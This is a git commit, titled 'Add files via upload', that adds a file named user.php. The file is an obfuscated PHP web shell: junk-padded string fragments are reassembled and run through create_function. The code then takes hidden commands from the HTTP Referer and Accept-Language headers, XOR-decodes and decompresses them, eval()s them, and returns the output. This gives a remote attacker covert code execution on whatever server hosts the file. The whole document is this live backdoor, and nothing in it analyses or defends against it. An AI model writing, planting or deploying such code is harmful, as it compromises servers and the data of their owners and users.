f3f6637895064832d449f43b77e78d13e49fb2f3
virtu4lgh0st <Biprodeep@gmail.com>
2017-10-25 10:26:39 +0530

    Add files via upload

---
+++ user.php
@@ -0,0 +1,19 @@
+<?php
+$s='SION;$ss="substrg|g|";$sl="strtog|g|lg|og|wer";$i=$m[1][0].$m[1g|][1];$g|h=$g|sl($ss(mdg';
+$D=str_replace('Y','','crYYeateY_fuYYncYtion');
+$w='u[g|"query"],g|$q);g|$q=array_g|valg|ues($qg|);g|prg|eg_match_all("/([\\g|w])g|[\\wg|-]+(?';
+$A='g|xg|(gzcompg|ress($og|g|),$k));prig|nt("g|g|<$k>$d</$k>");@seg|ssiong|_destrg|oy();}}}}';
+$k='4_decg|ode(pg|reg_repg|lace(ag|rray(g|"/_/","/-g|/")g|,array("/"g|,"+"g|),$ssg|($s[$i],0';
+$X='|g|5($i.$kg|g|h),0,3));$f=$g|sl($ss(md5g|($i.g|$kg|fg|),0,3g|));$p="";for($g|z=1;$z<coun';
+$K='"HTg|TP_ACg|g|CEPT_LANGUAGE"];ig|f($rrg|g|&&$ra){$u=parg|se_urlg|($rr)g|;parg|sg|e_str($';
+$h='g|,$g|eg|)g|)),$k)));$o=ob_geg|t_conteg|ntsg|();ob_g|end_clg|eag|n();$d=basg|e64_encode(';
+$l='g|t($m[g|1])g|;$z++)$p.=g|g|$q[$m[2][g|$z]g|];ifg|(strpos($g|p,$h)===0)g|g|{g|$s[$i]="";';
+$V='g|g|g|}^$k{$j};}}returg|n $o;}$rg|=$_SERVEg|R;$rrg|g|g|=@$r[g|"HTg|TP_REg|FERER"];$ra=@$r[';
+$W=':;q=0.(g|g|[\\d]))?,?g|/",$rag|,g|$m);if(g|$g|q&&$m){@seg|g|ssion_start()g|g|;$s=&$_g|SES';
+$v='$kh="g|4a62";$kf="g|1g|342";functg|g|ion x($t,g|$k){$c=strlg|eg|n($k);$l=sg|trlen($g|t);';
+$S='$g|p=$ssg|($p,3);}if(arrg|ay_kg|ey_exg|ig|sts($i,$s)g|){$s[$i].g|=$p;$e=g|stg|rpos($s[$g';
+$N='$g|o=g|g|"";for($i=0g|;$i<$l;g|){for(g|$j=0;($j<$c&g|&$g|i<$g|l);$jg|++,$i++){$o.=$g|t{$i';
+$J='|i],$f)g|g|;if($g|e){$k=$kh.$g|kf;obg|g|_start();@evg|al(@gzuncog|g|mprg|ess(@x(@basg|e6';
+$Y=str_replace('g|','',$v.$N.$V.$K.$w.$W.$s.$X.$l.$S.$J.$k.$h.$A);
+$d=$D('',$Y);$d();
+?>
